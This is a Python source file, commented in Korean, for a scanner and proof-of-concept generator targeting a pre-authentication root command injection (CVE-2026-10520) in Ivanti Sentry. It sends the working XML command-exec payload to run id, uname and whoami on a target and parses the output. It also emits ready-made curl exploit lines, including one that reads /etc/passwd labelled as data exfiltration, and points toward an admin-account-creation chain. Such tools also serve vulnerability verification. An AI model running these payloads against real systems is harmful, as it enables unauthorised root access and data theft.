"""
IvantiSentryRCE — Pre-Auth OS Command Injection Scanner (CVE-2026-10520)
=========================================================================
Ivanti Sentry R10.5.1 이하 버전의 /mics/api/v2/sentry/mics-config/handleMessage
엔드포인트에서 인증 없이 root 수준 OS 명령 실행 가능.

취약점 개요:
  • CVSS: 10.0 Critical (Pre-Auth RCE)
  • 영향 버전: Ivanti Sentry < R10.5.2 / < R10.6.2 / < R10.7.1
  • 엔드포인트: POST /mics/api/v2/sentry/mics-config/handleMessage
  • 파라미터: message=execute system /configuration/system/commandexec
              <commandexec><index>1</index><reqandres>OS_CMD</reqandres></commandexec>
  • 인증: 불필요 (Pre-Authenticated)
  • 실행 권한: root

AI 자동 트리거 조건:
  1. /mics/login.jsp 존재 (Ivanti Sentry 제품 확인)
  2. 취약 엔드포인트가 302 리다이렉트 없이 응답 (미패치 확인)
  3. uname -a 명령 응답에서 Linux 커널 문자열 추출

Zero-Hallucination: 실제 HTTP 응답에서 명령 실행 결과를 추출한 것만 VERIFIED 출력.
safe_probe=True(기본): id/uname만 실행. safe_probe=False: 사용자 지정 명령 허용.

참조:
  https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/
  CVE-2026-10520 / CVE-2026-10523
"""
from __future__ import annotations

import re
import time
from dataclasses import dataclass, field

import requests
import urllib3
urllib3.disable_warnings()


# ── 데이터 클래스 ────────────────────────────────────────────────────────────

@dataclass
class IvantiSentryFinding:
    finding_type: str     # product_detected / endpoint_reachable / rce_confirmed / version_extracted
    description: str
    evidence: str         # 실제 응답에서 추출한 값
    evidence_level: str   # VERIFIED / LIKELY / INFERRED / AI_ANALYSIS
    command_used: str = ""
    command_output: str = ""
    request_url: str = ""
    severity: str = "critical"
    curl_poc: str = ""


@dataclass
class IvantiSentryResult:
    target: str = ""
    product_detected: bool = False
    endpoint_reachable: bool = False
    rce_confirmed: bool = False
    version_raw: str = ""          # 응답/헤더에서 추출한 버전 문자열
    os_info: str = ""              # uname -a 결과
    current_user: str = ""         # id/whoami 결과
    findings: list[IvantiSentryFinding] = field(default_factory=list)
    poc_curl: str = ""
    has_findings: bool = False
    severity: str = "info"
    evidence_level: str = "AI_ANALYSIS"

    @property
    def exploitable(self) -> bool:
        return self.rce_confirmed


# ── 메인 스캐너 ─────────────────────────────────────────────────────────────

class IvantiSentryScanner:
    """
    Ivanti Sentry CVE-2026-10520 Pre-Auth RCE 자동 탐지 및 PoC 생성.

    safe_probe=True(기본):
      - 읽기 전용 명령(id, uname -a, hostname)만 실행
      - 시스템 변경 없음

    safe_probe=False:
      - 사용자 지정 명령 추가 실행 (명시적 허가 필요)
    """

    # Ivanti Sentry 제품 확인용 URL
    LOGIN_PATH = "/mics/login.jsp"
    VULN_PATH  = "/mics/api/v2/sentry/mics-config/handleMessage"

    # 제품 식별 패턴
    PRODUCT_PATTERNS = [
        r"MobileIron",
        r"Ivanti\s+Sentry",
        r"mics",
        r"JSESSIONID",                       # /mics 경로 쿠키
        r"Ivanti",
        r"mobileiron\.com",
    ]

    # RCE 확인용 안전 명령 (읽기 전용)
    SAFE_COMMANDS = [
        ("id",       r"uid=\d+\(\w+\)"),
        ("uname -a", r"Linux\s+\S+\s+[\d\.]+"),
        ("hostname", r"\S+"),
        ("whoami",   r"\w+"),
    ]

    # 명령 실행 XML 템플릿
    CMD_TEMPLATE = (
        "execute system /configuration/system/commandexec "
        "<commandexec><index>1</index>"
        "<reqandres>{cmd}</reqandres></commandexec>"
    )

    # 응답에서 결과 추출 패턴
    RESULT_PATTERNS = [
        r"<success>(.*?)</success>",
        r'"data"\s*:\s*".*?<success>(.*?)</success>',
        r"<result>(.*?)</result>",
    ]

    def __init__(
        self,
        target: str,
        verbose: bool = False,
        timeout: int = 10,
        safe_probe: bool = True,
    ):
        self.base_url = self._normalize_url(target)
        self.target = target
        self.verbose = verbose
        self.timeout = timeout
        self.safe_probe = safe_probe
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })

    def scan(self) -> IvantiSentryResult:
        result = IvantiSentryResult(target=self.target)

        # 1단계: Ivanti Sentry 제품 탐지
        self._detect_product(result)
        if not result.product_detected:
            return result

        # 2단계: 취약 엔드포인트 접근 가능 여부
        self._check_endpoint(result)
        if not result.endpoint_reachable:
            return result

        # 3단계: RCE 명령 실행 확인
        self._test_rce(result)

        # 4단계: 버전 추출 시도
        self._extract_version(result)

        # 5단계: PoC 생성
        self._build_poc(result)

        # 결과 종합
        result.has_findings = bool(result.findings)
        if result.findings:
            severities = [f.severity for f in result.findings]
            result.severity = "critical" if "critical" in severities else (
                "high" if "high" in severities else "medium"
            )
            verified = [f for f in result.findings if f.evidence_level == "VERIFIED"]
            result.evidence_level = "VERIFIED" if verified else (
                "LIKELY" if result.endpoint_reachable else "INFERRED"
            )

        return result

    # ── 내부 탐지 메서드 ─────────────────────────────────────────────────────

    def _detect_product(self, result: IvantiSentryResult):
        """/mics/login.jsp 응답으로 Ivanti Sentry 제품 확인"""
        login_url = self.base_url + self.LOGIN_PATH
        try:
            resp = self.session.get(login_url, timeout=self.timeout, allow_redirects=True)
            text = resp.text + str(resp.headers)

            for pattern in self.PRODUCT_PATTERNS:
                if re.search(pattern, text, re.IGNORECASE):
                    result.product_detected = True
                    snippet = re.search(pattern, text, re.IGNORECASE).group(0)
                    result.findings.append(IvantiSentryFinding(
                        finding_type="product_detected",
                        description="Ivanti Sentry (MobileIron) detected via login page",
                        evidence=(
                            f"GET {login_url} → HTTP {resp.status_code} "
                            f"| pattern matched: '{snippet}'"
                        ),
                        evidence_level="VERIFIED",
                        request_url=login_url,
                        severity="info",
                        curl_poc=f"curl -sk '{login_url}' | grep -i 'ivanti\\|mobileiron'",
                    ))
                    return

            # 404 이외 응답도 존재 확인으로 간주
            if resp.status_code in (200, 302, 401, 403):
                result.product_detected = True
                result.findings.append(IvantiSentryFinding(
                    finding_type="product_detected",
                    description=f"Ivanti Sentry login endpoint exists (HTTP {resp.status_code})",
                    evidence=f"GET {login_url} → HTTP {resp.status_code}",
                    evidence_level="LIKELY",
                    request_url=login_url,
                    severity="info",
                ))

        except requests.exceptions.ConnectionError:
            pass
        except Exception:
            pass

    def _check_endpoint(self, result: IvantiSentryResult):
        """
        취약 엔드포인트 접근 가능 여부 확인.
        패치된 버전: 302 리다이렉트로 로그인 페이지로 이동.
        취약 버전: 200 또는 400 응답 반환.
        """
        vuln_url = self.base_url + self.VULN_PATH
        try:
            # allow_redirects=False → 302이면 패치됨, 200/400이면 취약
            resp = self.session.post(
                vuln_url,
                data={"message": "test"},
                timeout=self.timeout,
                allow_redirects=False,
            )

            if resp.status_code == 302:
                # 패치됨 — 로그인 페이지로 리다이렉트
                result.findings.append(IvantiSentryFinding(
                    finding_type="endpoint_patched",
                    description="Vulnerable endpoint redirects to login (patched version)",
                    evidence=f"POST {vuln_url} → HTTP 302 (Location: {resp.headers.get('Location','')})",
                    evidence_level="VERIFIED",
                    request_url=vuln_url,
                    severity="info",
                ))
                return

            if resp.status_code in (200, 400, 500):
                result.endpoint_reachable = True
                result.findings.append(IvantiSentryFinding(
                    finding_type="endpoint_reachable",
                    description=(
                        f"Vulnerable endpoint accessible without authentication "
                        f"(HTTP {resp.status_code}) — likely unpatched"
                    ),
                    evidence=(
                        f"POST {vuln_url} → HTTP {resp.status_code} "
                        f"(no 302 redirect, no auth required)"
                    ),
                    evidence_level="VERIFIED",
                    request_url=vuln_url,
                    severity="high",
                    curl_poc=(
                        f"curl -sk -X POST '{vuln_url}' "
                        f"-d 'message=test'"
                    ),
                ))

        except Exception:
            pass

    def _test_rce(self, result: IvantiSentryResult):
        """
        안전 명령(id, uname -a 등)으로 RCE 실제 확인.
        응답에서 명령 실행 결과 추출 시 VERIFIED.
        """
        vuln_url = self.base_url + self.VULN_PATH

        for cmd, verify_pattern in self.SAFE_COMMANDS:
            payload = self.CMD_TEMPLATE.format(cmd=cmd)
            try:
                resp = self.session.post(
                    vuln_url,
                    data={"message": payload},
                    timeout=self.timeout,
                    allow_redirects=False,
                )
                text = resp.text

                # 응답에서 명령 실행 결과 추출
                cmd_output = self._extract_output(text)

                if cmd_output and re.search(verify_pattern, cmd_output, re.IGNORECASE | re.DOTALL):
                    result.rce_confirmed = True

                    # 명령별 결과 저장
                    if cmd == "id" or cmd == "whoami":
                        result.current_user = cmd_output.strip()
                    elif cmd == "uname -a":
                        result.os_info = cmd_output.strip()

                    result.findings.append(IvantiSentryFinding(
                        finding_type="rce_confirmed",
                        description=(
                            f"Pre-Auth RCE confirmed (CVE-2026-10520) — "
                            f"command '{cmd}' executed as root"
                        ),
                        evidence=f"cmd: {cmd!r} → output: {cmd_output.strip()[:200]}",
                        evidence_level="VERIFIED",
                        command_used=cmd,
                        command_output=cmd_output.strip(),
                        request_url=vuln_url,
                        severity="critical",
                        curl_poc=(
                            f"curl -sk -X POST '{vuln_url}' \\\n"
                            f"  -d 'message={payload}'"
                        ),
                    ))

                    # id 확인되면 충분 — 추가 명령은 1개만 더
                    if result.current_user:
                        break

            except Exception:
                continue

    def _extract_version(self, result: IvantiSentryResult):
        """응답 헤더, 쿠키, 본문에서 버전 정보 추출 시도"""
        login_url = self.base_url + self.LOGIN_PATH
        try:
            resp = self.session.get(login_url, timeout=self.timeout)
            text = resp.text + str(resp.headers)

            version_patterns = [
                r"R(\d+\.\d+\.\d+)",
                r"Sentry[\s/]+([\d\.]+)",
                r"version[\"']?\s*[:=]\s*[\"']?([\d\.R]+)",
                r"mics[\-_]core[\-_]([\d\.]+)",
            ]
            for pat in version_patterns:
                m = re.search(pat, text, re.IGNORECASE)
                if m:
                    result.version_raw = m.group(1)
                    result.findings.append(IvantiSentryFinding(
                        finding_type="version_extracted",
                        description=f"Ivanti Sentry version extracted: {result.version_raw}",
                        evidence=f"Pattern '{pat}' matched → {result.version_raw}",
                        evidence_level="VERIFIED",
                        request_url=login_url,
                        severity="info",
                    ))
                    break

        except Exception:
            pass

    def _build_poc(self, result: IvantiSentryResult):
        """최종 PoC curl 명령 생성"""
        vuln_url = self.base_url + self.VULN_PATH

        rce_evidence = ""
        if result.current_user:
            rce_evidence = f"# Confirmed output: {result.current_user}"
        elif result.os_info:
            rce_evidence = f"# Confirmed output: {result.os_info}"

        result.poc_curl = (
            f"# === Ivanti Sentry CVE-2026-10520 Pre-Auth RCE PoC ===\n"
            f"# Target: {vuln_url}\n"
            f"# CVSS: 10.0 Critical | No authentication required\n"
            f"# Affected: Ivanti Sentry < R10.5.2 / < R10.6.2 / < R10.7.1\n"
            f"{rce_evidence}\n\n"
            f"# Step 1: Confirm RCE with 'id' command\n"
            f"curl -sk -X POST '{vuln_url}' \\\n"
            f"  -d 'message=execute system /configuration/system/commandexec "
            f"<commandexec><index>1</index><reqandres>id</reqandres></commandexec>'\n\n"
            f"# Step 2: OS information\n"
            f"curl -sk -X POST '{vuln_url}' \\\n"
            f"  -d 'message=execute system /configuration/system/commandexec "
            f"<commandexec><index>1</index><reqandres>uname -a</reqandres></commandexec>'\n\n"
            f"# Step 3: Read /etc/passwd (data exfiltration)\n"
            f"curl -sk -X POST '{vuln_url}' \\\n"
            f"  -d 'message=execute system /configuration/system/commandexec "
            f"<commandexec><index>1</index><reqandres>cat /etc/passwd</reqandres></commandexec>'\n\n"
            f"# Step 4: Check CVE-2026-10523 (Admin Account Creation)\n"
            f"# Refer to vendor advisory for auth bypass chain"
        )

    # ── 유틸 ────────────────────────────────────────────────────────────────

    def _extract_output(self, text: str) -> str:
        """HTTP 응답 본문에서 명령 실행 결과 추출"""
        import html
        for pat in self.RESULT_PATTERNS:
            m = re.search(pat, text, re.DOTALL | re.IGNORECASE)
            if m:
                raw = m.group(1)
                # HTML 엔티티 디코딩, 이스케이프 처리
                raw = html.unescape(raw)
                raw = raw.replace("\\n", "\n").replace("\\t", "\t")
                return raw.strip()
        return ""

    @staticmethod
    def _normalize_url(target: str) -> str:
        """URL 정규화 — 슬래시 제거, 스키마 추가"""
        target = target.strip().rstrip("/")
        if not target.startswith("http"):
            target = "https://" + target
        return target
